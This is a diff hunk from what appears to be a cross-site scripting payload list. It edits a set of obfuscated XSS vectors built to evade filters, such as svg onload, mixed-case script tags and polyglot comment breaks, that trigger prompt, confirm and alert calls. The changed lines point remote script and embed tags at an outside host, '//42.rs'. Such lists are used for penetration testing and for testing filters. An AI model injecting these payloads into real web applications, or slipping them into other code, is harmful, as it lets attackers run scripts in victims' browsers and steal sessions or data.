@@ -12,9 +12,9 @@
 <svg%0Aonload=%09((pro\u006dpt))(4242)//
 <sCript x>(((confirm)))``</scRipt x>
 <svg </onload ="1> (_=prompt,_(4242)) "">
-<!--><script src=//14.rs>
-<embed src=//14.rs>
-<script x=">" src=//15.rs></script>
+<!--><script src=//42.rs>
+<embed src=//42.rs>
+<script x=">" src=//42.rs></script>
 <!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`4242` //>
 <iframe/src \/\/onload = prompt(4242)
 <x oncut=alert(4242)>x
